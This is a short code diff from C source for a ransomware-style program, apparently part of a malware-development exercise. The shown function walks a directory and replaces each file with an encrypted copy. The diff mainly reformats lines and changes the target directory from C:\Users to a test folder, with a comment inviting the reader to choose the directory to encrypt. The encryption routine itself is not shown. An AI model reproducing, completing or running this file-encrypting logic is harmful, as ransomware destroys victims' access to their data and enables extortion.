@@ -394,10 +394,9 @@ BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath, int* fileIndex) {
 
         if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
             printf("\t> Encrypting File: %ws ... ", szFullStrPath);
-            if (ReplaceWithEncryptedFile(szFullStrPath, (*fileIndex)++)) {
+                        if (ReplaceWithEncryptedFile(szFullStrPath, (*fileIndex)++)) {
                 printf("[+] DONE\n");
-            }
-            else {
+            } else {
                 printf("[-] Failed\n");
             }
         }
@@ -413,7 +412,7 @@ _END_OF_FUNC:
 }
 
 int main() {
-    WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users";
+	WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder"; // Change this to the directory you want to encrypt
     int fileIndex = 1;
     EncryptFilesInGivenDir(DirectoryPath, &fileIndex);
     return 0;
